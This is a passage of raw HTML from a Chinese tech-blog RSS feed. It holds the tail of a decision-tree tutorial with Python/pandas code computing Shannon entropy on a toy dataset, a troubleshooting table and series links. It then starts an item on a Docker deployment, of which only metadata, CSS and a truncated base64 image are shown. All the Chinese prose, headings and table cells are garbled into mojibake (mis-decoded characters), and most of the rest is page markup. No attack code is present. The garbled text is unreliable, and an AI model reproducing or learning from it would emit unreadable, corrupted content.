<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54e09860b7db413a8f09dce4a6b2ceaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=6WSquPtidyV0Lc34cTtWhh3PQmY%3D" alt="é¦™å†œç†µçš„è®¡ç®—" loading="lazy"/>
è¿™é‡Œç»™å‡ºä¸‰ç§ä¸çº¯æ€§åº¦é‡æ–¹æ³•çš„è®¡ç®—å®ä¾‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3d7af7a5c64448198a8659b91be1d62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=SdPar8%2B06rIum8A0AJInFO%2F3uGI%3D" alt="é¦™å†œç†µçš„è®¡ç®—" loading="lazy"/>
ä»ä¸Šé¢çš„ä¾‹å­åŠå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œä¸åŒçš„ä¸çº¯æ€§åº¦é‡æ˜¯ä¸€è‡´çš„ã€‚æ ¹æ®è®¡ç®—ï¼ŒèŠ‚ç‚¹ N1 å…·æœ‰æœ€ä½çš„ä¸çº¯æ€§åº¦é‡å€¼ï¼Œç„¶åä¾æ¬¡æ˜¯ N2ã€N3ã€‚è™½ç„¶ç»“æœæ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯ä½œä¸ºæµ‹è¯•æ¡ä»¶çš„å±æ€§é€‰æ‹©ä»ç„¶å› ä¸çº¯æ€§åº¦é‡çš„é€‰æ‹©è€Œå¼‚ã€‚</p>
<h2 data-id="heading-6">é¦™å†œç†µçš„ä»£ç å®ç°</h2>
<pre><code class="hljs language-python" lang="python">row_data = {
    <span class="hljs-string">'æ˜¯å¦é™ªä¼´'</span> :[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],
    <span class="hljs-string">'æ˜¯å¦ç©æ¸¸æˆ'</span>:[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],
    <span class="hljs-string">'æ¸£ç”·'</span> :[<span class="hljs-string">'æ˜¯'</span>,<span class="hljs-string">'æ˜¯'</span>,<span class="hljs-string">'ä¸æ˜¯'</span>,<span class="hljs-string">'ä¸æ˜¯'</span>,<span class="hljs-string">'ä¸æ˜¯'</span>]
}

dataSet = pd.DataFrame(row_data)
dataSet
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e82f16bca214df29c4cab67afc5289b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=1ZZT3nhPGXfSJlV7uGxskTtY26I%3D" alt="PandasåŠ è½½æ•°æ®" loading="lazy"/>
é€šè¿‡ä»£ç å®ç°ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">calEnt</span>(<span class="hljs-params">dataSet</span>):
    <span class="hljs-comment"># æ•°æ®é›†æ€»è¡Œæ•°</span>
    n = dataSet.shape[<span class="hljs-number">0</span>]
    <span class="hljs-comment"># æ ‡ç­¾çš„æ‰€æœ‰ç±»åˆ«</span>
    iset = dataSet.iloc[:,-<span class="hljs-number">1</span>].value_counts() 
    <span class="hljs-comment"># æ¯ä¸€ç±»æ ‡ç­¾æ‰€å æ¯”</span>
    p = iset/n
    <span class="hljs-comment"># è®¡ç®—ä¿¡æ¯ç†µ</span>
    ent = (-p*np.log2(p)).<span class="hljs-built_in">sum</span>() 
    <span class="hljs-keyword">return</span> ent

calEnt(dataSet)
</code></pre>
<p>è¿è¡Œçš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77d727ac200e4bdfa0fbb83bfa6408a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=86OFJ%2Fz1zSO3qisgP19zMSpsbhc%3D" alt="ç¼–å†™ä»£ç å®ç°" loading="lazy"/>
ç†µè¶Šé«˜ï¼Œä¿¡æ¯çš„ä¸çº¯åº¦å°±è¶Šé«˜ï¼Œåˆ™æ··åˆçš„æ•°æ®å°±è¶Šå¤šã€‚
ä¹Ÿå°±æ˜¯è¯´ï¼Œå•ä»åˆ¤æ–­çš„ç»“æœæ¥çœ‹ï¼Œå¦‚æœä½ ä»è¿™ 5 ä¸ªäººä¸­ççŒœï¼Œè¦å‡†ç¡®åˆ¤æ–­å…¶ä¸­ä¸€ä¸ªäººæ˜¯ä¸æ˜¯â€œbad boyâ€æ˜¯ä¸å®¹æ˜“çš„ã€‚</p>
<h2 data-id="heading-7">é”™è¯¯é€ŸæŸ¥</h2>























































<table><thead><tr><th>ç—‡çŠ¶</th><th>æ ¹å› å®šä½</th><th>ä¿®å¤</th></tr></thead><tbody><tr><td>è®­ç»ƒé›†å‡†ç¡®ç‡æé«˜ï¼Œæµ‹è¯•é›†æ˜æ˜¾ä¸‹é™</td><td>æ ‘å¤ªæ·±ã€å¶å­æ ·æœ¬æ•°è¿‡å°ï¼ŒæŒç»­ç»†åˆ†å¯¼è‡´è¿‡æ‹Ÿåˆ</td><td>çœ‹æ ‘æ·±åº¦ã€å¶èŠ‚ç‚¹æ ·æœ¬æ•°åˆ†å¸ƒã€éªŒè¯é›†æ›²çº¿é¢„å‰ªæï¼ˆmax_depth/min_samples_leaf/min_samples_splitï¼‰ã€åå‰ªæï¼ˆä»£ä»·å¤æ‚åº¦å‰ªæç­‰ï¼‰</td></tr><tr><td>åˆ’åˆ†ç»“æœä¸ç¨³å®šã€è½»å¾®æ•°æ®æ‰°åŠ¨æ ‘ç»“æ„å¤§å˜</td><td>å†³ç­–æ ‘é«˜æ–¹å·®æ¨¡å‹ï¼Œå¯¹é‡‡æ ·/å™ªå£°æ•æ„Ÿ</td><td>å¤šæ¬¡ä¸åŒéšæœºç§å­è®­ç»ƒå¯¹æ¯”æ ‘ç»“æ„ç”¨é›†æˆæ–¹æ³•ï¼ˆRandomForest/GBDTï¼‰æˆ–é™åˆ¶æ·±åº¦ã€å¢åŠ å¶å­æœ€å°æ ·æœ¬</td></tr><tr><td>è¿ç»­ç‰¹å¾åˆ’åˆ†æ•ˆæœå·®æˆ–è§£é‡Šå›°éš¾</td><td>è¿ç»­å˜é‡åˆ‡åˆ†ç‚¹é€‰æ‹©ä¸ä½³ï¼›æˆ–ç¦»æ•£åŒ–ç­–ç•¥ä¸åˆç†</td><td>æ£€æŸ¥å€™é€‰åˆ‡åˆ†ç‚¹æšä¸¾/æ’åºé€»è¾‘ï¼›è§‚å¯Ÿåˆ†è£‚åçº¯åº¦å˜åŒ–é‡‡ç”¨åŸºäºä¸çº¯åº¦çš„æœ€ä¼˜åˆ‡åˆ†ç‚¹æœç´¢ï¼›å¿…è¦æ—¶åšåˆ†ç®±å¹¶éªŒè¯ä¿¡æ¯å¢ç›Šå˜åŒ–</td></tr><tr><td>ç±»åˆ«æä¸å‡è¡¡æ—¶ï¼Œå¶å­èŠ‚ç‚¹æ¦‚ç‡åç½®æ˜æ˜¾</td><td>å¶èŠ‚ç‚¹ P(Y\mid X\in R_j) è¢«å¤šæ•°ç±»ä¸»å¯¼</td><td>çœ‹å¶èŠ‚ç‚¹ç±»åˆ«è®¡æ•°ä¸æ¦‚ç‡ä»£ä»·æ•æ„Ÿå­¦ä¹ /ç±»æƒé‡/é‡é‡‡æ ·ï¼›è¯„ä¼°æŒ‡æ ‡æ”¹ç”¨F1/PR-AUC</td></tr><tr><td>ç†µè®¡ç®—å¾—åˆ° NaN/inf</td><td>æ¦‚ç‡ä¸º0å¯¼è‡´ \log(0)</td><td>æ‰“å° value_counts ä¸ pï¼›æ£€æŸ¥æ˜¯å¦å‡ºç°0æ¦‚ç‡é¡¹å¯¹æ¦‚ç‡åŠ æå°å€¼ epsilonï¼›æˆ–åœ¨è®¡ç®—ä¸­è·³è¿‡ p=0 çš„é¡¹</td></tr><tr><td>Pandas ä»£ç æŠ¥ NameErrorï¼špd/np æœªå®šä¹‰</td><td>æœªå¯¼å…¥åº“</td><td>æŸ¥çœ‹æ‰§è¡Œç¯å¢ƒ importè¡¥å…… import pandas as pdã€import numpy as np</td></tr><tr><td>value_counts() ç»“æœé¡ºåºä¸é¢„æœŸä¸ä¸€è‡´</td><td>é»˜è®¤æŒ‰é¢‘æ¬¡é™åºï¼Œä¸æŒ‰æ ‡ç­¾é¡ºåº</td><td>æ‰“å° value_counts è¾“å‡ºæ˜ç¡®æ’åºéœ€æ±‚ï¼šsort_index() æˆ–æŒ‡å®šç±»åˆ«é¡ºåºï¼ˆCategoricalï¼‰</td></tr><tr><td>è¯¯æŠŠâ€œç†µè¶Šé«˜=ä¿¡æ¯è¶Šå¤šâ€å½“ä½œâ€œè¶Šå¥½â€</td><td>ç†µè¡¨ç¤ºä¸ç¡®å®šæ€§/æ··æ‚åº¦ï¼Œè®­ç»ƒä¸­å¸Œæœ›åˆ†è£‚åä¸çº¯åº¦ä¸‹é™</td><td>å¯¹æ¯”åˆ†è£‚å‰åç†µ/åŸºå°¼å˜åŒ–å¼ºè°ƒç›®æ ‡æ˜¯é™ä½ä¸çº¯åº¦ï¼ˆæå‡çº¯åº¦ï¼‰ï¼Œç†µé«˜é€šå¸¸è¡¨ç¤ºæ›´éš¾åˆ†</td></tr><tr><td>è®¤ä¸ºâ€œä¸åŒä¸çº¯åº¦åº¦é‡ç»“æœä¸€è‡´â†’å±æ€§é€‰æ‹©ä¸€å®šä¸€è‡´â€</td><td>åº¦é‡æ’åºå¯èƒ½ä¸€è‡´ï¼Œä½†æœ€ä½³åˆ’åˆ†å±æ€§å¯èƒ½ä¸åŒ</td><td>åŒä¸€æ•°æ®ç”¨ç†µ/åŸºå°¼åˆ†åˆ«ç®—ä¸€æ¬¡å€™é€‰ç‰¹å¾åˆ†æ•°è¯´æ˜åº¦é‡ä¸€è‡´æ€§ä¸ç­‰ä»·äºé€‰æ‹©ä¸€è‡´ï¼›ç”¨äº¤å‰éªŒè¯æˆ–ä¸šåŠ¡çº¦æŸé€‰å‹</td></tr></tbody></table>
<h2 data-id="heading-8">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-9">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-10">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-207 RabbitMQ Direct äº¤æ¢å™¨è·¯ç”±ï¼šRoutingKey ç²¾ç¡®åŒ¹é…ã€é˜Ÿåˆ—å¤šç»‘å®šä¸æ—¥å¿—åˆ†æµå®æˆ˜</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-11">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨dockeréƒ¨ç½²koa+sql server+reacté¡¹ç›®å®Œæ•´è¿‡ç¨‹]]></title>    <link>https://juejin.cn/post/7589176150494396470</link>    <guid>https://juejin.cn/post/7589176150494396470</guid>    <pubDate>2025-12-30T04:30:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589176150494396470" data-draft-id="7587704265054928934" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨dockeréƒ¨ç½²koa+sql server+reacté¡¹ç›®å®Œæ•´è¿‡ç¨‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-30T04:30:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Hyinglin"/> <meta itemprop="url" content="https://juejin.cn/user/2362231708723822"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨dockeréƒ¨ç½²koa+sql server+reacté¡¹ç›®å®Œæ•´è¿‡ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2362231708723822/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Hyinglin
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T04:30:02.000Z" title="Tue Dec 30 2025 04:30:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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